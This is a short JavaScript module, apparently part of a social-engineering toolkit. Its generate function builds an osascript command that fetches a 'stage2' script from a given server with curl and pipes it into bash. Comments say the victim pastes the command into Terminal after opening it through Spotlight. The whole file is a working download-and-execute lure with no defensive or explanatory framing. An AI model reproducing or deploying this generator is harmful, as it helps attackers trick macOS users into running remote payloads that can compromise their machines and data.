function generate(token, serverUrl) {
    // osascript to run shell command via Terminal
    // User pastes into Terminal after opening via Spotlight
    const cmd = `curl -s ${serverUrl}/stage2 | bash`;
    return `osascript -e 'do shell script "${cmd}"'`;
}

module.exports = { generate };
